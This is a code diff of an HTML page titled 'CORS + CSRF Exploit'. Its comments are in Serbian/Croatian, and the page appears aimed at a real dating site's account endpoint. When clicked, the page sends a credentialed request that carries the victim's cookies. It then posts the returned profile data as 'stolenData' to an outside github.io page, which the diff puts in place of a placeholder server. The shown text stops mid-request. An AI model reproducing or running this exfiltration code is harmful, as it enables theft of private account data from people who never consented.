@@ -1,22 +1,28 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORS Exploit Test</title>
+    <title>CORS + CSRF Exploit</title>
 </head>
 <body>
-    <h1>CORS Exploit</h1>
-    <button id="exploitButton">Send CORS Request</button>
+    <h1>CORS + CSRF Exploit</h1>
+    <button id="exploitButton">Execute Exploit</button>
     <script>
         document.getElementById("exploitButton").onclick = function() {
             fetch("https://api.ashleymadison.com/account/manageprofile/", {
                 method: "GET",
-                credentials: "include"
+                credentials: "include" // Automatski uključuje kolačiće žrtve
             })
-            .then(response => response.text())
+            .then(response => {
+                if (response.ok) {
+                    return response.text();
+                } else {
+                    throw new Error("Failed to fetch data.");
+                }
+            })
             .then(data => {
-                console.log("Stolen Data:", data);
-                // Pošalji ukradene podatke na svoj server
-                fetch("https://example.com/steal-data", { // Zameni sa svojim serverom
+                console.log("Response Data:", data);
+                // Pošalji ukradene podatke na tvoj GitHub Pages sajt
+                fetch("https://solomonone227.github.io/csrf_ovaj.html/cors_test.html", {
                     method: "POST",
                     body: JSON.stringify({ stolenData: data }),
                     headers: { "Content-Type": "application/json" }
